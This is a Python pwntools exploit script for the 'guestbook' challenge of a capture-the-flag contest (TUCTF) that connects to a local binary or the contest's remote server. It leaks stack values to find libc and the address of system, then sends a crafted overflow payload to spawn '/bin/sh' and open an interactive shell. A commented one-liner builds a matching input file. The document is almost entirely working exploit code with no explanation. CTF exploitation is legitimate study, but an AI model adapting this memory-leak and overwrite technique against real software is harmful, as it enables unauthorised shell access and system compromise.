from pwn import *
import sys

def init():
	for i in range(4):
        	print p.recv()
        	p.sendline("/bin/sh")

def view(idx):
	print p.recv()
	p.sendline("1")
	print p.recv()
	p.sendline(str(idx))

def change(idx, payload):
	print p.recv()
	p.sendline("2")
	print p.recv()
	p.sendline(str(idx))
	print p.recv()
	p.sendline(payload)

if len(sys.argv) == 1:
	p = process("./guestbook")#, env={"LD_PRELOAD":"./libc.so.6"})
else:
	p = remote("guestbook.tuctf.com", 4545)

init()
view(6)
leak1 = u32(p.recv(4))
leak2 = u32(p.recv(4))
leak3 = u32(p.recv(4))
leak4 = u32(p.recv(4))
leak5 = u32(p.recv(4))
leak6 = u32(p.recv(4))
leak7 = u32(p.recv(4))
leak8 = u32(p.recv(4))

log.info("leak : 0x%x" % leak1)
log.info("leak : 0x%x" % leak2)
log.info("leak : 0x%x" % leak3)
log.info("leak : 0x%x" % leak4)
log.info("leak : 0x%x" % leak5)
log.info("leak : 0x%x" % leak6)
log.info("leak : 0x%x" % leak7)
log.info("leak : 0x%x" % leak8)

system = leak6
libc_base = leak6 - 0x3ada0
log.info("libc base : 0x%x" % libc_base)

raw_input()

payload = "/bin/sh\x00"+"a"*(0x98-0x34-8)+"\x01\x00\x00\x00"+"a"*8+p32(leak1)+"\x00"*(0x18+12+4)+p32(system)+p32(leak1)*4
change(0, payload)

p.interactive()

"""
python -c 'print "1\n"*4+"2\n"+"1\n"+"a"*(0x98-0x34)+"\x01\x00\x00\x00"+"a"*8+"\x08\x80\x55\x56"+"\x00"*(0x18+12+4)+"bbbb\n"' > file
"""
